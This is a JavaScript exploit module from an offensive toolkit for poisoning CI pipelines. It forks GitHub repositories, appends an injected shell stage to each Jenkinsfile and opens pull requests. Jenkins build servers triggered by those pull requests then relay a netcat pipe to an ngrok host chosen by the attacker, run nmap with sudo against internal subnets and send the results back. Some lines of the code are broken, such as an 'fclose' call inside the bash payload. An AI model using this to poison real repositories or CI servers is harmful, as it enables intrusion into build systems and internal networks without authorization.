const log = console.log,
  chalk = require('chalk'),
  green = chalk.green,
  cyan = chalk.cyan,
  ngrok = require('ngrok'),
  github = require(__dirname + '/../../../lib/gh'),
  files = require(__dirname + '/../../../lib/files'),
  repos = require(__dirname + '/../../../lib/repos'),
  exp = require(__dirname + '/../../../lib/exp'),
  jenkins = require(__dirname + '/../../../modules/jenkins'),
  server = require(__dirname + '/../../../lib/server'),
  ng = require(__dirname + '/../../../lib/ng'),
  targets = require(__dirname + '/../../../lib/targets'),
  repodir = __dirname + '/../../../../repos';

module.exports = {

  // This particular run function returns an array of netcat listeners
  run: (callback) => {
    exp.exploitSingleHarness('github', 'forked', module.exports.type(), module.exports.name(), (err, token, authed_user, raw_targets, ci_targets, nc, duplex, nc_port, hostname, ng_port, ng_server, ng_url) => {
      if (err) {
        log(err);
        return callback();
      } else {
        // Load the Jenkinsfile file into the repos
        jenkins.loadJenkinsConfigAll(module.exports.name(), authed_user, ci_targets, () => {
          const append_promises = [];

          // iterate through list of files, find jenkins configs and append to the file
          for (let t in ci_targets) {
            append_promises.push(new Promise((resolve, reject) => {
              jenkins.appendJenkinsConfig(`${repodir}/${ci_targets[t]}/Jenkinsfile`, module.exports.injectionString(ng_port, hostname));
              resolve();
            }).catch(err => {
              reject();
              log(err);
            }));
          }

          // Cash in the promises from above
          Promise.all(append_promises)
            .then(c => {
              log(chalk.green("Making pull requests..."));
              repos.pullRequestAll(token, 'forked', authed_user, raw_targets, () => {
                let cbcount = 0;
                log(chalk.green("Wating for nmap scan to complete. Sit tight."));
                duplex.pipe(process.stdout);
                nc.on('data', (info, msg) => {
                  if (msg.toString('utf8').includes("ciderdone")) {
                    cbcount++;
                    if (cbcount >= ci_targets.length) {
                      log(chalk.green("Nmap Scan Complete"));
                      duplex.unpipe(process.stdout);
                      nc.close();
                      ngrok.disconnect(ng_url);
                      return callback();
                    }
                  }
                });
              });
            }).catch(e => {
              if (e) {
                log(e);
              }
            });
        });
      }
    })
  },

  name: () => {
    return "jenkins/nmap";
  },

  type: () => {
    return "jenkins";
  },

  info: (cb) => {
    log(cyan("---\nINFO\n---\n"));
    log((`This exploit runs a basic nmap scan against the 10.10.0.0/16 network\n
on the Jenkins server. This module will be expanded to scan custom IP ranges.\n 
NOTE: This will only work against Jenkins builds spawned from pull requests`));

    log(cyan("ORDER OF EXECUTION\n------------------\n"));
    log(("1) Fork all targets"));
    log(("2) Clone all forked targets locally"));
    log(("3) Start single shell handler"));
    log(("4) Load and poison the Jenkinsfile of the cloned repos"));
    log(("5) Push commited changes, and submit a pull request"));
    log(("6) Listen for incoming messages. Close shell once executed."));
    return cb();
    // Print information about the exploit
  },

  injectionString: (ng_port, hostname) => {
    return `\n                sh "#!/bin/bash \\n +"\n                \
"export NGPORT=${ng_port} \\n +"\n                \
"export NGHOSTNAME=${hostname} \\n +"\n                \
"mkfifo piperz \\n +"\n                \
"nc -k -l 12345 0<piperz|nc $NGHOSTNAME $NGPORT 1>piperz & \\n +"\n                \
"sudo apt-get update \\n +"\n                \
"sudo apt-get install nmap \\n +"\n                \
"sudo nmap -sT 10.10.20.0/24 -Pn | nc localhost 12345 \\n +"\n                \
"echo "ciderdone" | nc localhost 12345 \\n +"\n                \
"sudo fclose(piperz)"\n                \
}\n            \
}\n        \
}\n    \
}`;
  },

  options: () => {
    log(green("\n-------\nOPTIONS\n-------\n"));
    log(green("NO OPTIONS. This is the 'easy' exploit. No need to set IPs or ports."));
  }
}